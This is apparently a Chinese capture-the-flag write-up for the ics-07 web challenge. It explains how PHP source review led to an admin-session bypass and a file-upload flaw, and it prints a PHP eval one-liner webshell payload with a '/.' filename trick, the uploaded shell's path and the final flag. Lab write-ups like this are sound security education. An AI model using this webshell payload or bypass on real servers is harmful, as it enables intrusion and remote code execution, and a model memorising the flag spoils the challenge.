# 原创
：  【攻防世界WEB】难度五星15分进阶题：ics-07

# 【攻防世界WEB】难度五星15分进阶题：ics-07

## 二、ics-07

> 

 

<h3>解题方法：</h3>
1、php源码分析，文件上传漏洞，一句话木马


> 
<h3>过程：</h3>
robots.txt什么都没有

 

那随便点，只有这个云平台管理中心可以进去
后面还进行了传参

判断是否存在字符型注入
都加上了单/双引号各一个
都没有报错

判断是否存在数字型注入
and 1=1
and 1=2
发现等号是被编码了


还有一个view-source按钮
点击之后出来源码了

 
<hr/>
对源码进行分析：
代码1：
isset() 函数：检测变量是否已设置并且非 NULL
show_source()函数：对文件进行语法高亮显示
header() 函数：向客户端发送原始的 HTTP 报头

 page传参不能为空（为空就die）
page传参不能有index.php，只能包含flag.php
<hr/>
代码2：
preg_match 函数：执行一个正则表达式匹配
chdir() 函数：改变当前的目录，需规定新目录
fopen() 函数：打开文件或者 URL（并伴随权限）
fwrite () 函数：向文件写入字符串，成功返回写入的字符数，否则返回 FALSE
fclose() 函数：关闭文件

 流程是：
1、先传入
2、进行正则过滤
3、改变目录
4、打开文件
5、写入文件
6、关闭文件
（这有不就是文件上传漏洞嘛，上传一句话木马，或者图片马）
且上传的路径为/uploaded/backup/
<hr/>
代码3：
floatval()：返回变量的浮点值
substr()：截取，这里是截取id的最后以为 必须是9
mysql_real_escape_string() ：转义 SQL 语句中使用的字符串中的特殊字符
mysql_query() ：执行一条 MySQL 查询
mysql_fetch_object() ：从结果集（记录集）中取得一行作为对象

如果输入正确的话，会返回id和user（即是admin）
id：浮点值不为1，并且最后一位要是9，且是字符串（这就特别多了）
前面分析得到：page=flag.php

 获得
id=1
name=admin
<hr/>
思路：
这里最重要的就是达到$_SESSION['admin'] = True
然后再能进行文件上传（上传一句话木马）
然后蚁剑（冰蝎，菜刀）连接
找到flag
<hr/>
发现登录进去并获得id，name了，但是并未跳转到upload页面
（可能是不会显示出来）
尝试POST上传一句话木马
通过代码2中传入的参数，知道是使用con和file
payload：
con=&lt;?php eval($_POST['1']);?&gt;&amp;file=shell.php/.

<hr/>
 
再连接（代码2中知道上传到/uploaded/backup/下）
61.147.171.105:57480/uploaded/backup/shell.php/

 连接进来了<img alt="" height="868" src="https://img-blog.csdnimg.cn/30944864931b4739a819f590fe8408c5.png" width="1200"/>
 在html中找到flag.php

 <img alt="" height="868" src="https://img-blog.csdnimg.cn/e19e602f4c2045e59e983c1c154ffe42.png" width="1200"/>
 cyberpeace{d2f720b48b37fca33797773be4a3c755}


---


---


---

